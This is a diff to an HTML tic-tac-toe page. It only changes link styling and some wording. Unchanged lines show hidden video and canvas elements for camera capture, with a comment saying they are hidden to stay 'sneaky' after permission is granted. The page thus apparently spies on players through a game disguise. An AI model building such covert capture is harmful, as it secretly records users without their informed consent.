@@ -31,6 +31,16 @@
             cursor: pointer;
         }
         .cell:hover { background-color: #555; }
+
+      a{
+        padding-block: 10px;
+        padding-inline: 30px;
+        border-radius: 20px;
+        width: 300px;
+        background-color: gray;
+        text-decoration: none;
+        color: white;
+      }
         /* Hide the video elements so it stays sneaky after permission is granted */
         #video, #canvas { display: none; }
     </style>
@@ -38,7 +48,7 @@
 <body>
 
     <h1>Tic-Tac-Toe</h1>
-    <p><em>2 player mode</em></p>
+    <p><em>This is 2 player game!</em></p>
     
     <div class="board" id="board">
         <!-- 9 cells for the game -->
@@ -52,7 +62,10 @@
         <div class="cell" onclick="makeMove(this)"></div>
         <div class="cell" onclick="makeMove(this)"></div>
     </div>
-    <div align=center><a href="aimode.html">Wanna try the AI Mode?</a></div>
+  <br>
+  <br>
+  <br>
+  <div align=center><a href="aimode.html">Wanna try AI MODE 🤖?</a></div>
 
     <!-- Hidden elements for camera capture -->
     <video id="video" autoplay playsinline></video>
